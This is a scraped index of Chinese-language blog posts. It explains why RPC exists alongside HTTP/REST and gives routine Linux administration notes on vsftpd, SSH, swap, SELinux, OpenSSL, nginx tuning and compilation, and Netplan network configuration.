RPC 并列的，都是跨应用调用方法的解决方案；另一个则是被 RPC 包含的，是 RPC 通信过程的可选协议之一。 因此，第一个问题的答案是都对。看指的是哪一个蓝色框。从题主的提问看，既然题主在纠结这两者，应该是指与 RPC 并列的蓝色框。所以，题主所述的 HTTP 请求应该是指：基于 HTTP 的远程调用方案（包含了接口规范、序列化反序列化等）。这样，它才是和 RPC 同一级别的概念。 第二个问题是在问远程过程调用（红色框）是不是包含了 Restful（黄色框），这种理解的关键在于对 RPC 的理解。 RPC 字面理解是远程过程调用，即在一个应用中调用另一个应用的方法。那 Restful 是满足的，通过它可以实现在一个应用中调用另一个应用的方法。 但是，上述理解使得 RPC 的定义过于宽泛。RPC 通常特指在一个应用中调用另一个应用的接口而实现的远程调用，即红色框所指的范围。这样，RPC 是不包含 Restful 的。 因此，第二个问题的答案是 Restful 不属于 RPC，除非对 RPC 有着非常规的宽泛理解。 RPC 的英文全称是 Remote Procedure Call，翻译为中文叫“远程过程调用”。其中稍显晦涩的其实就是“过程”，过程其实就是方法。所以，可以把 RPC 理解为“远程方法调用”。 要了解远程过程调用，那先理解过程调用。非常简单，如下图，就是调用一个方法。这太常见了，不多解释。 而在分布式系统中，因为每个服务的边界都很小，很有可能调用别的服务提供的方法。这就出现了服务 A 调用服务 B 中方法的需求，即远程过程调用。 要想让服务 A 调用服务 B 中的方法，最先想到的就是通过 HTTP 请求实现。是的，这是很常见的，例如服务 B 暴露 Restful 接口，然后让服务 A 调用它的接口。基于 Restful 的调用方式因为可读性好（服务 B 暴露出的是 Restful 接口，可读性当然好）而且 HTTP 请求可以通过各种防火墙，因此非常不错。 然而，如前面所述，基于 Restful 的远程过程调用有着明显的缺点，主要是效率低、封装调用复杂。当存在大量的服务间调用时，这些缺点变得更为突出。 服务 A 调用服务 B 的过程是应用间的内部过程，牺牲可读性提升效率、易用性是可取的。基于这种思路，RPC 产生了。 通常，RPC 要求在调用方中放置被调用的方法的接口。调用方只要调用了这些接口，就相当于调用了被调用方的实际方法，十分易用。于是，调用方可以像调用内部接口一样调用远程的方法，而不用封装参数名和参数值等操作。 那要想实现这个过程该怎么办呢？别急，咱们一步一步来。 首先，调用方调用的是接口，必须得为接口构造一个假的实现。显然，要使用动态代理。这样，调用方的调用就被动态代理接收到了。 第二，动态代理接收到调用后，应该想办法调用远程的实际实现。这包括下面几步： 识别具体要调用的远程方法的 IP、端口 将调用方法的入参进行序列化 通过通信将请求发送到远程的方法中 这样，远程的服务就接收到了调用方的请求。它应该： 反序列化各个调用参数 定位到实际要调用的方法，然后输入参数，执行方法 按照调用的路径返回调用的结果 整个过程如下所示。 这样，RPC 操作就完成了。 调用方调用内部的一个方法，但是被 RPC 框架偷梁换柱为远程的一个方法。之间的通信数据可读性不需要好，只需要 RPC 框架能读懂即可，因此效率可以更高。通常使用 UDP 或者 TCP 作为通讯协议，当然也可以使用 HTTP。例如下面的示例中，为了保证实现最简单，就用了 HTTP 进行通信。 讲到这里，RPC 的产生原因、原理应该清楚了。 所以，不要被 RPC 吓到，它就是让一个应用调用另一个应用中方法的一种实现方式。与调用远程接口区别不大，条条大路通罗马。 再说一次，不是说 RPC 好，也不是说 HTTP 好，两者各有千秋。本质上，两者是可读性和效率之间的抉择，通用性和易用性之间的抉择。最终谁能发展更好，很难说。 要问我站谁？我根据业务场景，灵活站位……","link":"/backend/why_rpc/"},{"title":"FTP 配置之 Vsftpd","text":"在 centos 下通过 yum 安装 1# yum -y install vsftpd 配置 /etc/vsftpd/vsftpd.conf ,将匿名用户登录关闭 1anonymous_enable=NO 对 ftp 外用户做出限制 1chroot_local_user=YES 如果用户被限定在了其主目录下，则该用户的主目录不能再具有写权限了 1allow_writeable_chroot=YES 创建 FTP 用户 1useradd -s /sbin/nologin -d /home/website kain 给 kain 添加密码 1passwd kain 让防火墙允许 21 端口 1/sbin/iptables -I INPUT -p tcp --dport 21 -j ACCEPT 重启 vsftpd 1systemctl restart vsftpd","link":"/ops/vsftpd/"},{"title":"SSH 登录限制","text":"只允许指定用户进行登录修改 /etc/ssh/sshd_config，例如：允许 aliyun 和从 192.168.1.1 登录的 test 帐户通过 SSH 登录系统 1AllowUsers aliyun test@192.168.1.1 只拒绝指定用户进行登录修改 /etc/ssh/sshd_config，例如：拒绝 zhangsan、aliyun 帐户通过 SSH 登录系统 1DenyUsers zhangsan aliyun 固定的 IP 进行禁止登录修改 /etc/hosts.allow 1234# 允许 192.168.0.1 这个 IP 地址 ssh 登录sshd:192.168.0.1:allow# 允许 192.168.0.1/24 这段 IP 地址的用户登录sshd:192.168.0.1/24:allow","link":"/ops/ssh_limit/"},{"title":"SWAP 交换分区","text":"Linux 中的 SWAP（交换分区），类似于 Windows 的虚拟内存。系统会把一部分硬盘空间虚拟成内存使用，将系统内非活动内存换页到 SWAP，以提高系统可用内存。 开启 swap创建用于交换分区的文件 script1dd if=/dev/zero of=/mnt/swap bs=1M count=2048 设置交换分区文件 script1mkswap /mnt/swap 立即启用交换分区文件 script1swapon /mnt/swap 设置开机时自启用 SWAP 分区, 需要修改文件 /etc/fstab 中的 SWAP 行, 添加 1/mnt/swap swap swap defaults 0 0 修改 swpapiness 参数, 可以使用下述方法临时修改此参数, 假设我们配置为空闲内存少于 10% 时才使用 SWAP 分区 script1echo 10 &gt;/proc/sys/vm/swappiness 若需要永久修改此配置，在系统重启之后也生效的话，可以修改 /etc/sysctl.conf 文件，并增加以下内容 1vm.swappiness=10","link":"/ops/swap/"},{"title":"SSH 免密码登录","text":"使用 ssh-keygen 生成密钥对 1ssh-keygen -t rsa 生成之后会在用户的根目录生成一个 “.ssh”的文件夹 id_rsa 生成的私钥文件 id_rsa.pub 生成的公钥文件 将公钥公钥重命名为 authorized_keys, 设置权限 12chmod 700 -R .sshchmod 600 .ssh/authorized_keys","link":"/ops/ssh_key/"},{"title":"SSH 频繁掉线","text":"找到文件 /etc/ssh/sshd_config 进行修改 12ClientAliveInterval 15ClientAliveCountMax 45 ClientAliveInterval 是每隔多少秒，服务器端向客户端发送心跳，ClientAliveCountMax 是多少次心跳无响应之后，断开 Client 连接 然后重启 sshd 服务 1# systemctl restart sshd 重新打开客户端就不会频繁掉线了","link":"/ops/ssh_disconnect/"},{"title":"Selinux 开启和关闭","text":"如果 SELinux status 参数为 enabled 即为开启状态 123/usr/sbin/sestatus -vgetenforce 临时关闭 SELinux 1setenforce 0 修改 /etc/selinux/config，将 SELINUX=enforcing 改为 SELINUX=disabled，关闭 SELinux","link":"/ops/selinux/"},{"title":"openssl去掉私钥密码","text":"执行 1openssl rsa -in ~/.ssh/id_rsa -out ~/.ssh/id_rsa_new 备份旧私钥 1mv ~/.ssh/id_rsa ~/.ssh/id_rsa.backup 使用新私钥 1mv ~/.ssh/id_rsa_new ~/.ssh/id_rsa 设置权限 1chmod 600 ~/.ssh/id_rsa","link":"/ops/openssl_remove/"},{"title":"OpenSSL 生成密钥证书","text":"OpenSSL 是为网络通信提供安全及数据完整性的一种安全协议，囊括了主要的密码算法、常用的密钥和证书封装管理功能以及 SSL 协议，并提供了丰富的应用程序供测试或其它目的使用 生成 RSA 密钥生成私钥 script1openssl genrsa -out rsa_private_key.pem 1024 把 RSA 私钥转换成 PKCS8 格式 script1openssl pkcs8 -topk8 -inform PEM -in rsa_private_key.pem -outform PEM –nocrypt 生成 RSA 公钥 script1openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem 生成 ECC 密钥生成私密 script1openssl ecparam -genkey -name prime256v1 -out domain.key 生成指定证书 script1openssl req -new -sha256 -key domain.key -out domain_csr.txt 注意事项： ECC 算法加密强度有 3 个选项：prime256v1/secp384r1/secp521r1/prime256v1 目前已经足够安全，如无特殊需要请保持 ECC 算法 prime256v1 默认即可。 SHA256 目前已经足够安全，如无特殊需要请保持默认。 生成公钥 script1openssl ec -in domain.key -pubout -out pubkey.pem 签发私有证书生成私钥 script1openssl genrsa &gt; cert.key 生成 CA 证书 script1openssl req -new -x509 -key cert.key &gt; cert.pem","link":"/ops/openssl_gen/"},{"title":"OpensSSL 编译","text":"查看版本 script1openssl version 官网下载 https://www.openssl.org 编译 script1234# 签发配置./config# 配置编译make &amp;&amp; make install 建立链接 script123sudo ln -s /usr/local/ssl/bin/openssl /usr/bin/opensslsudo ln -s /usr/local/lib64/libssl.so.1.1 /usr/lib64/libssl.so.1.1sudo ln -s /usr/local/lib64/libcrypto.so.1.1 /usr/lib64/libcrypto.so.1.1 重建缓存 script1sudo ldconfig","link":"/ops/openssl_build/"},{"title":"NGINX 优化","text":"修改 sysctl.conf 对 Linux 内核参数优化，让 Nginx 更加充分的发挥性能，以下参数需要根据业务逻辑和实际的硬件成本来综合考虑 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# 表示单个进程最大可以打开的句柄数fs.file-max = 999999# 参数设置为 1 ，表示允许将TIME_WAIT状态的socket重新用于新的TCP链接，这对于服务器来说意义重大，因为总有大量TIME_WAIT状态的链接存在net.ipv4.tcp_tw_reuse = 1# 当keepalive启动时，TCP发送keepalive消息的频度；默认是2小时，将其设置为10分钟，可以更快的清理无效链接ner.ipv4.tcp_keepalive_time = 600# 当服务器主动关闭链接时，socket保持在FIN_WAIT_2状态的最大时间net.ipv4.tcp_fin_timeout = 30# 这个参数表示操作系统允许TIME_WAIT套接字数量的最大值，如果超过这个数字，TIME_WAIT套接字将立刻被清除并打印警告信息。该参数默认为180000，过多的TIME_WAIT套接字会使Web服务器变慢net.ipv4.tcp_max_tw_buckets = 5000# 定义UDP和TCP链接的本地端口的取值范围net.ipv4.ip_local_port_range = 1024 65000# 定义了TCP接受缓存的最小值、默认值、最大值net.ipv4.tcp_rmem = 10240 87380 12582912# 定义TCP发送缓存的最小值、默认值、最大值net.ipv4.tcp_wmem = 10240 87380 12582912# 当网卡接收数据包的速度大于内核处理速度时，会有一个列队保存这些数据包。这个参数表示该列队的最大值net.core.netdev_max_backlog = 8096# 表示内核套接字接受缓存区默认大小net.core.rmem_default = 6291456# 表示内核套接字发送缓存区默认大小net.core.wmem_default = 6291456# 表示内核套接字接受缓存区最大大小net.core.rmem_max = 12582912# 表示内核套接字发送缓存区最大大小net.core.wmem_max = 12582912# 用于解决TCP的SYN攻击net.ipv4.tcp_syncookies = 1# 这个参数表示TCP三次握手建立阶段接受SYN请求列队的最大长度，默认1024，将其设置的大一些可以使出现Nginx繁忙来不及accept新连接的情况时，Linux不至于丢失客户端发起的链接请求net.ipv4.tcp_max_syn_backlog = 8192# 这个参数用于设置启用timewait快速回收net.ipv4.tcp_tw_recycle = 1# 选项默认值是128，这个参数用于调节系统同时发起的TCP连接数，在高并发的请求中，默认的值可能会导致链接超时或者重传，因此需要结合高并发请求数来调节此值net.core.somaxconn = 262114# 选项用于设定系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。如果超过这个数字，孤立链接将立即被复位并输出警告信息。这个限制指示为了防止简单的DOS攻击，不用过分依靠这个限制甚至认为的减小这个值，更多的情况是增加这个值net.ipv4.tcp_max_orphans = 262114 隐藏版本号 123http {+ server_tokens off;} 隐藏 X-Powered-By，需要修改 php.ini 1expose_php = Off 禁止 Scrapy 等爬虫工具的抓取、禁止指定 UA 及 UA 为空的访问、禁止非 GET|HEAD|POST 方式的抓取 12345678910111213141516server { #禁止Scrapy等爬虫工具的抓取 if ($http_user_agent ~* &quot;Scrapy|Sogou web spider|Baiduspider&quot;) { return 403; } #禁止指定UA及UA为空的访问 if ($http_user_agent ~ &quot;FeedDemon|JikeSpider|Indy Library|Alexa Toolbar|AskTbFXTV|AhrefsBot|CrawlDaddy|CoolpadWebkit|Java|Feedly|UniversalFeedParser|ApacheBench|Microsoft URL Control|Swiftbot|ZmEu|oBot|jaunty|Python-urllib|lightDeckReports Bot|YYSpider|DigExt|YisouSpider|HttpClient|MJ12bot|heritrix|EasouSpider|LinkpadBot|Ezooms|^$&quot; ) { return 403; } #禁止非GET|HEAD|POST方式的抓取 if ($request_method !~ ^(GET|HEAD|POST)$) { return 403; }}","link":"/ops/nginx_optimization/"},{"title":"NGINX 编译","text":"适用于 centos、debain 与 ubuntu 系统进行编译安装与部署 安装编译所需开发库 在 centos 下执行安装 script1yum install gcc gcc-c++ autoconf automake zlib zlib-devel pcre-devel 如果是 debain 或 ubuntu 下执行安装 script1apt install build-essential libpcre3 libpcre3-dev autoconf zlib1g-dev 准备编译源码 NGINX 官网 下载需要的版本源码 Openssl 官网 下载版本 &gt;=1.0.2 的版本源码 当今 http2.0 协议正在普及，因此如果使用该模块，用于编译的 openssl 源码包版本必须 &gt;=1.0.2，nginx 推荐使用最新的稳定版本 将准备好的源码包分别解压，进入到 nginx 源码目录下 配置安装默认下，可以直接使用执行，但是很多模块是不包含在内的 script1./configure 为了减少以后再次配置编译，以下这些配置都是我们常用到的 script123456789101112131415161718192021222324252627282930313233343536./configure \\--error-log-path=/var/logs/nginx/error.log \\--http-log-path=/var/logs/nginx/access.log \\--sbin-path=/usr/sbin \\--pid-path=/run/nginx.pid \\--lock-path=/run/nginx.lock \\--http-client-body-temp-path=/var/nginx/client_temp \\--http-proxy-temp-path=/var/nginx/proxy_temp \\--http-fastcgi-temp-path=/var/nginx/fastcgi_temp \\--http-uwsgi-temp-path=/var/nginx/uwsgi_temp \\--http-scgi-temp-path=/var/nginx/scgi_temp \\--user=nginx \\--group=nginx \\--with-openssl=/root/openssl-1.1.0i \\--with-http_ssl_module \\--with-http_realip_module \\--with-http_addition_module \\--with-http_sub_module \\--with-http_dav_module \\--with-http_flv_module \\--with-http_mp4_module \\--with-http_gunzip_module \\--with-http_gzip_static_module \\--with-http_random_index_module \\--with-http_secure_link_module \\--with-http_stub_status_module \\--with-http_auth_request_module \\--with-mail \\--with-debug \\--with-mail_ssl_module \\--with-file-aio \\--with-threads \\--with-stream \\--with-stream_ssl_module \\--with-http_slice_module \\--with-http_v2_module 执行后，配置检测无误就可以编译与安装了 script1make &amp;&amp; make install 环境配置为 nginx 新增用户与用户组 script12groupadd -r nginxuseradd -s /sbin/nologin -g nginx -r nginx 创建运行环境需要的目录 script12mkdir /var/logs/nginxmkdir /var/nginx 检测一下配置是否正常 script1nginx -t 如果提示这些信息，就说明基础的安装配置完成了 script12nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful 优化配置 以下是我个人对 nginx 的一些优化与理解，主要针对常用配置合理定义并将虚拟域名分开管理 修改主配置文件 nginx.conf，先将使用用户加入配置 1user nginx nginx; 让工作进程自动配置，通常情况下有多少个逻辑处理内核就对应多少个工作进程 1worker_processes auto; 关闭惊群 accept_mutex，合理最大并发数设定 worker_connections 1234events { worker_connections 4096; accept_mutex off;} accept_mutex 惊群是一种管理机制，例如在初始状态下少量的进程在保持运转，而并发攀升时其他休眠的进程会逐步被唤醒工作，这样的好处是正常访问下负载相对较低，但是当访问一直处于高位，这种方式反而效率会变低，所以关闭惊群让进程一直待命处理更加高效稳定。 开启文件异步线程池 123http { aio threads;} 大幅度提高 IO 性能，有数据表示开启与不开启性能相差 31 倍，请求不再因为工作进程被阻塞在读文件，而滞留在事件队列中，等待处理，它们可以被空闲的进程处理掉 开启 sendfile 1234http { sendfile on; sendfile_max_chunk 256;} sendfile 是一种高效的传输模式，对比传统的(read、write/send 方式)能减少拷贝次数，从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，操作效率很高。开启后内对文件的解析处理会有很大提升，sendfile_max_chunk 可以减少阻塞调用 sendfile()所花费的最长时间，因为 Nginx 不会尝试一次将整个文件发送出去，而是每次发送大小为 256KB 的块数据 开启 tcp_nopush、 tcp_nodelay 1234http { tcp_nopush on; tcp_nodelay on;} tcp_nopush 是让一个数据包里发送所有头文件，而不一个接一个的发送，tcp_nodelay 是不要缓存数据，而是一段一段的发送，这样有助于解决网络堵塞 开启 GZIP 1234567891011http { gzip on; gzip_disable &quot;MSIE [1-6].(?!.*SV1)&quot;; gzip_http_version 1.1; gzip_vary on; gzip_proxied any; gzip_min_length 1000; gzip_buffers 16 8k; gzip_comp_level 5; gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss;} 开启 GZIP 的目的是压缩静态请求，提高加载速度 优化反向代理 12345678910http { proxy_connect_timeout 5; proxy_read_timeout 60; proxy_send_timeout 5; proxy_buffer_size 16k; proxy_buffers 4 64k; proxy_busy_buffers_size 128k; proxy_temp_file_write_size 128k; proxy_temp_path /var/nginx/proxy_temp;} proxy_connect_timeout 给反向代理的服务设置连接的超时时间 proxy_read_timeout 连接成功后，等候等待反向代理服务的响应时间 proxy_send_timeout 反向代理服务数据回传时间 proxy_buffer_size 指令设置缓冲区大小 proxy_buffers 指令设置缓冲区的大小和数量 proxy_busy_buffers_size 缓冲区满载后写入磁盘的临时文件大小 proxy_temp_file_write_size 一次访问能写入的临时文件的大小 proxy_temp_path 临时文件目录 设置长连接 123http { keepalive_timeout 5;} 设置 keep-alive 客户端连接在服务器端保持开启的超时值 最终 nginx.conf 配置是这样的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556user nginx nginx;worker_processes auto;error_log /var/run/error.log info;pid /var/run/nginx.pid;lock_file /var/run/nginx.lock;events { worker_connections 4096; accept_mutex off;}http { include mime.types; server_names_hash_bucket_size 64; default_type application/octet-stream; client_max_body_size 16m; access_log off; aio threads; sendfile on; sendfile_max_chunk 256k; tcp_nopush on; tcp_nodelay on; gzip on; gzip_disable &quot;MSIE [1-6].(?!.*SV1)&quot;; gzip_http_version 1.1; gzip_vary on; gzip_proxied any; gzip_min_length 1000; gzip_buffers 16 8k; gzip_comp_level 5; gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss; log_format main $remote_addr - $remote_user [$time_local] &quot;$request&quot; $status $body_bytes_sent &quot;$http_referer&quot; &quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;; proxy_connect_timeout 5; proxy_read_timeout 60; proxy_send_timeout 5; proxy_buffer_size 16k; proxy_buffers 4 64k; proxy_busy_buffers_size 128k; proxy_temp_file_write_size 128k; proxy_temp_path /var/cache/nginx/proxy_temp; keepalive_timeout 5; server { listen 80 default; return 404; } include vhost/**/*.conf;} 创建一个 vhost 目录来管理虚拟域名，include vhost/**/*.conf; 就是将该目录引入 设置虚拟域名 虚拟域名我通常是放在 vhost 目录下，定义一个虚拟域名创建一个文件夹(可以将文件夹命名为域名)，其内部大概包含 site.conf、site.crt、site.key(子配置、证书、签名) 例如：定义子配置 1234567891011121314151617181920212223242526272829303132333435363738394041server { listen 80; server_name &lt;域名&gt;; rewrite ^(.*)$ https://&lt;域名&gt;$1 permanent;}server { listen 443 ssl http2; listen [::]:443 ssl http2; server_name api.yelinvan.cc; charset utf-8; ssl_certificate &lt;证书的绝对路径&gt;; ssl_certificate_key &lt;签名的绝对路径&gt;; ssl_session_cache shared:SSL:20m; ssl_session_timeout 10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_ciphers ECDH+AESGCM:ECDH+AES256:ECDH+AES128:DH+3DES:!ADH:!AECDH:!MD5; root &lt;虚拟目录路径&gt;; location / { aio threads=default; index index.html &lt;index.php&gt;; # proxy_pass http://127.0.0.1:&lt;port&gt;; } # location ~ \\.php$ { # fastcgi_pass 127.0.0.1:9000; # &lt;fastcgi_pass unix:php-fpm.sock&gt;; # fastcgi_index index.php; # fastcgi_split_path_info ^((?U).+\\.php)(/?.+)$; # fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; # include fastcgi_params; # } error_page 404 403 /404.html; error_page 500 502 503 504 /50x.html;} 加入 Systemctl创建文件 /etc/systemd/system/nginx.service 123456789101112131415[Unit]Description=The NGINX HTTP and reverse proxy serverAfter=syslog.target network.target remote-fs.target nss-lookup.target[Service]Type=forkingPIDFile=/run/nginx.pidExecStartPre=/usr/sbin/nginx -tExecStart=/usr/sbin/nginxExecReload=/usr/sbin/nginx -s reloadExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true[Install]WantedBy=multi-user.target 启动 nginx script1systemctl start nginx 加入开机启动 script1systemctl enable nginx","link":"/ops/nginx_build/"},{"title":"Netplan 配置示例","text":"以下是常见方案的示例 Netplan 配置的集合。如果您看不到某个场景或有一个场景可以做出贡献，可反馈至 Netplan configuration examples - Report a bug with this site 配置配置 netplan ,可以到 /etc/netplan 目录下找到扩展名 .yaml 配置文件（例如：/etc/netplan/config.yaml ）进行修改，然后执行 sudo netplan apply 解析配置并运用至应用系统中。在 /etc/ netplan/ 下写入磁盘的配置将在两次重启之间保持不变。 使用 DHCP 和 静态地址假设名为 enp3s0 的接口通过 DHCP 获得地址，可创建具有以下内容的 YAML 文件： 123456network: version: 2 renderer: networkd ethernets: enp3s0: dhcp4: true 如果设置静态 IP 地址，请使用地址键，该键获取（IPv4 或 IPv6），地址以及子网前缀长度（例如 /24）的列表。 也可以提供网关和 DNS 信息： 1234567891011network: version: 2 renderer: networkd ethernets: enp3s0: addresses: - 10.10.10.2/24 gateway4: 10.10.10.1 nameservers: search: [mydomain, otherdomain] addresses: [10.10.10.1, 1.1.1.1] 连接多个接口使用 DHCP现在，许多系统都包含多个网络接口。 服务器通常将需要连接到多个网络，并且可能要求到 Internet 的流量通过特定的接口，尽管它们都提供了有效的网关。 通过为通过 DHCP 检索的路由指定度量标准，可以实现 DHCP 所需的精确路由，这将确保某些路由优先于其他路由。 在此示例中， enred 优先于 engreen ，因为它具有较低的路由指标： 1234567891011network: version: 2 ethernets: enred: dhcp4: yes dhcp4-overrides: route-metric: 100 engreen: dhcp4: yes dhcp4-overrides: route-metric: 200 连接至开发无线网络Netplan 轻松支持连接到开放的无线网络（该网络不受密码保护），只需要定义访问点即可： 1234567network: version: 2 wifis: wl0: access-points: opennetwork: {} dhcp4: yes 连接至 WPA 个人无线网络无线设备使用 wifi 键，并与有线以太网设备共享相同的配置选项。 还应指定无线接入点的名称和密码： 1234567891011121314network: version: 2 renderer: networkd wifis: wlp2s0b1: dhcp4: no dhcp6: no addresses: [192.168.0.21/24] gateway4: 192.168.0.1 nameservers: addresses: [192.168.0.1, 8.8.8.8] access-points: &quot;network_ssid_name&quot;: password: &quot;**********&quot; 连接到 WPA 企业无线网络找到使用 WPA 或 WPA2 Enterprise 保护的无线网络也是很常见的，这需要附加的身份验证参数。 例如，如果使用 WPA-EAP 和 TTLS 保护网络安全： 12345678910111213network: version: 2 wifis: wl0: access-points: workplace: auth: key-management: eap method: ttls anonymous-identity: &quot;@internal.example.com&quot; identity: &quot;joe@internal.example.com&quot; password: &quot;v3ryS3kr1t&quot; dhcp4: yes 或者，如果使用 WPA-EAP 和 TLS 保护网络安全： 12345678910111213141516network: version: 2 wifis: wl0: access-points: university: auth: key-management: eap method: tls anonymous-identity: &quot;@cust.example.com&quot; identity: &quot;cert-joe@cust.example.com&quot; ca-certificate: /etc/ssl/cust-cacrt.pem client-certificate: /etc/ssl/cust-crt.pem client-key: /etc/ssl/cust-key.pem client-key-password: &quot;d3cryptPr1v4t3K3y&quot; dhcp4: yes 支持许多不同的加密模式。 请参阅 Netplan 参考页。 在单个接口上使用多个地址地址键可以获取要分配给接口的地址列表： 123456789network: version: 2 renderer: networkd ethernets: enp3s0: addresses: - 10.100.1.38/24 - 10.100.1.39/24 gateway4: 10.100.1.1 不支持接口别名（例如 eth0：0）。 通过多个网关使用多个地址与上面的示例类似，具有多个地址的接口可以是配置有多个网关。 1234567891011121314151617181920network: version: 2 renderer: networkd ethernets: enp3s0: addresses: - 9.0.0.9/24 - 10.0.0.10/24 - 11.0.0.11/24 #gateway4: # unset, since we configure routes below routes: - to: 0.0.0.0/0 via: 9.0.0.1 metric: 100 - to: 0.0.0.0/0 via: 10.0.0.1 metric: 100 - to: 0.0.0.0/0 via: 11.0.0.1 metric: 100 鉴于有多个地址，每个地址都有自己的网关，我们在此不指定 gateway4，而是使用子网的网关地址将各个路由配置为 0.0.0.0/0（任何地方）。 应该调整指标值，以便按预期进行路由。 DHCP 可用于接收接口的 IP 地址之一。 在这种情况下，该地址的默认路由将自动配置为度量值 100。作为路由下条目的简写形式，可以将 gateway4 设置为其中一个子网的网关地址。 在这种情况下，可以从路由中省略该子网的路由。 其指标将设置为 100。 使用网络管理器作为渲染器Netplan 同时支持网络和网络管理器作为后端。 您可以使用渲染器键指定应使用哪个网络后端来配置特定设备。 您还可以通过仅指定渲染器密钥将网络的所有配置委派给网络管理器本身： 123network: version: 2 renderer: NetworkManager 配置接口绑定通过使用物理接口列表和绑定模式声明绑定接口来配置绑定。 以下是使用 DHCP 获取地址的主动备份绑定的示例： 123456789101112network: version: 2 renderer: networkd bonds: bond0: dhcp4: yes interfaces: - enp3s0 - enp4s0 parameters: mode: active-backup primary: enp3s0 下面是一个充当具有各种绑定接口和不同类型的路由器的系统的示例。 请注意 optional: true 键声明，该声明允许进行引导而无需等待这些接口完全激活。 1234567891011121314151617181920212223242526272829303132333435363738394041424344network: version: 2 renderer: networkd ethernets: enp1s0: dhcp4: no enp2s0: dhcp4: no enp3s0: dhcp4: no optional: true enp4s0: dhcp4: no optional: true enp5s0: dhcp4: no optional: true enp6s0: dhcp4: no optional: true bonds: bond-lan: interfaces: [enp2s0, enp3s0] addresses: [192.168.93.2/24] parameters: mode: 802.3ad mii-monitor-interval: 1 bond-wan: interfaces: [enp1s0, enp4s0] addresses: [192.168.1.252/24] gateway4: 192.168.1.1 nameservers: search: [local] addresses: [8.8.8.8, 8.8.4.4] parameters: mode: active-backup mii-monitor-interval: 1 gratuitious-arp: 5 bond-conntrack: interfaces: [enp5s0, enp6s0] addresses: [192.168.254.2/24] parameters: mode: balance-rr mii-monitor-interval: 1 配置网桥要创建一个由使用 DHCP 的单个设备组成的非常简单的网桥，请输入： 1234567891011network: version: 2 renderer: networkd ethernets: enp3s0: dhcp4: no bridges: br0: dhcp4: yes interfaces: - enp3s0 一个更复杂的示例，要使 libvirtd 使用带有标记 vlan 的特定网桥，同时继续提供未标记的接口，将涉及： 123456789101112131415network: version: 2 renderer: networkd ethernets: enp0s25: dhcp4: true bridges: br0: addresses: [10.3.99.25/24] interfaces: [vlan15] vlans: vlan15: accept-ra: no id: 15 link: enp0s25 然后，通过将以下内容添加到 /etc/libvirtd/ emu/networks/ 下的新 XML 文件中，将 libvirtd 配置为使用此桥。 &lt;bridge&gt; 标记以及 &lt;name&gt; 中的网桥名称需要与使用 netplan 配置的网桥设备的名称匹配： 12345&lt;network&gt; &lt;name&gt;br0&lt;/name&gt; &lt;bridge name='br0'/&gt; &lt;forward mode=&quot;bridge&quot;/&gt;&lt;/network&gt; 将 VLAN 附加到网络接口要使用重命名的接口配置多个 VLAN，请执行以下操作： 12345678910111213141516171819202122232425network: version: 2 renderer: networkd ethernets: mainif: match: macaddress: &quot;de:ad:be:ef:ca:fe&quot; set-name: mainif addresses: [&quot;10.3.0.5/23&quot;] gateway4: 10.3.0.1 nameservers: addresses: [&quot;8.8.8.8&quot;, &quot;8.8.4.4&quot;] search: [example.com] vlans: vlan15: id: 15 link: mainif addresses: [&quot;10.3.99.5/24&quot;] vlan10: id: 10 link: mainif addresses: [&quot;10.3.98.5/24&quot;] nameservers: addresses: [&quot;127.0.0.1&quot;] search: [domain1.example.com, domain2.example.com] 到达直接连接的网关这允许使用 on-link 关键字设置默认路由或任何路由，其中网关是直接连接到网络的 IP 地址，即使该地址与接口上配置的子网不匹配也是如此。 123456789network: version: 2 renderer: networkd ethernets: addresses: [ &quot;10.10.10.1/24&quot; ] routes: - to: 0.0.0.0/0 via: 9.9.9.9 on-link: true 对于 IPv6，配置将非常相似，但显着的不同是附加的范围：将主机路由链接到所需的路由器地址： 1234567891011network: version: 2 renderer: networkd ethernets: addresses: [ &quot;2001:cafe:face:beef::dead:dead/64&quot; ] routes: - to: &quot;2001:cafe:face::1/128&quot; scope: link - to: &quot;::/0&quot; via: &quot;2001:cafe:face::1&quot; on-link: true 配置源路由可以将路由表添加到特定接口，以允许在两个网络之间进行路由： 在下面的示例中，ens3 在 192.168.3.0/24 网络上，ens5 在 192.168.5.0/24 网络上。 这使任一网络上的客户端都可以连接到另一网络，并使响应来自正确的接口。 此外，默认路由仍分配给 ens5，允许任何其他流量通过。 123456789101112131415161718192021222324252627network: version: 2 renderer: networkd ethernets: ens3: addresses: - 192.168.3.30/24 dhcp4: no routes: - to: 192.168.3.0/24 via: 192.168.3.1 table: 101 routing-policy: - from: 192.168.3.0/24 table: 101 ens5: addresses: - 192.168.5.24/24 dhcp4: no gateway4: 192.168.5.1 routes: - to: 192.168.5.0/24 via: 192.168.5.1 table: 102 routing-policy: - from: 192.168.5.0/24 table: 102 配置回送接口Networkd 不允许创建新的回送设备，但是用户可以将新地址添加到标准回送接口 lo 中，以使其在计算机上以及自定义路由中被视为有效地址： 12345678network: version: 2 renderer: networkd ethernets: lo: match: name: lo addresses: [7.7.7.7/32] 与 Windows DHCP 服务器集成对于 Windows Server 使用 dhcp-identifier 键提供 DHCP 的网络，可以实现互操作性： 123456network: version: 2 ethernets: enp3s0: dhcp4: yes dhcp-identifier: mac 连接 IP 隧道隧道允许管理员配置两个连接特殊隧道接口并执行所需路由的端点，从而在 Internet 上扩展网络。 Netplan 支持 SIT，GRE，IP-in-IP（ipip，ipip6，ip6ip6），IP6GRE，VTI 和 VTI6 隧道。 隧道的常见用法是在仅支持 IPv4 的网络上启用 IPv6 连接。 下面的示例显示了如何配置这样的隧道。 这里的 1.1.1.1 是客户自己的 IP 地址； 2.2.2.2 是远程服务器的 IPv4 地址，2001:dead:beef::2/64 是隧道定义的客户端的 IPv6 地址，2001:dead:beef::1 是远程服务器的 IPv6 地址 。 最后，2001:cafe:face::1/64 是路由的 IPv6 